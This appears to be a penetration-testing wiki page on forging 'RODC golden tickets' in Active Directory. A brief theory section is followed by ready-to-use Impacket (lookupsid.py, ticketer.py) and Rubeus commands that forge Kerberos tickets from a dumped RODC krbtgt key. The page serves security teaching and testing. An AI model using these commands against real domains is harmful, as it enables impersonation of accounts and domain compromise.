---
authors: ShutdownRepo
category: ad
---

# RODC Golden tickets

## Theory

With administrative access to an [RODC](../../builtins/rodc.md), it is possible to dump all the cached credentials, including those of the`krbtgt_XXXXX` account. The hash can be used to forge a "RODC golden ticket" for any account in the `msDS-RevealOnDemandGroup` and not in the `msDS-NeverRevealGroup` attributes of the RODC. This ticket can be presented to the RODC or any accessible standard writable Domain Controller to request a Service Ticket (ST).

> [!TIP]
> When presenting a RODC golden ticket to a writable (i.e. standard) Domain Controller, it is not worth crafting the PAC because it will be recalculated by the writable Domain Controller when issuing a service ticket (ST).

## Practice

::: tabs

=== UNIX-like

> [!NOTE]
> _At the time of writing, 15th Apr. 2026,_ [_the pull request_](https://github.com/fortra/impacket/pull/2169) _adding the `-rodcNo` flag in `ticketer.py` is pending._

There are [Impacket](https://github.com/fortra/impacket) scripts for each step of a golden ticket creation : retrieving the domain SID, creating the RODC golden ticket.

```bash
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# Create the RODC golden ticket (with an RC4 key, i.e. NT hash)
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"

# Create the RODC golden ticket (with an AES 128/256bits key)
ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" "randomuser"

# Create the RODC golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
```


=== Windows

From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used for this purpose.


```powershell
Rubeus.exe golden /rodcNumber:$KBRTGT_NUMBER /flags:forwardable,renewable,enc_pa_rep /nowrap /outfile:ticket.kirbi /aes256:$KRBTGT_AES_KEY /user:USER /id:USER_RID /domain:domain.local /sid:DOMAIN_SID
```


:::

> [!TIP]
> > The secret ingredient for making an RODC golden ticket viable is including the correct key version number in the _kvno_ field of the ticket. 
> >
> > _(Elad Shamir on_ [_specterops.io_](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)_)_

## Resources

[https://adsecurity.org/?p=3592](https://adsecurity.org/?p=3592)

[https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)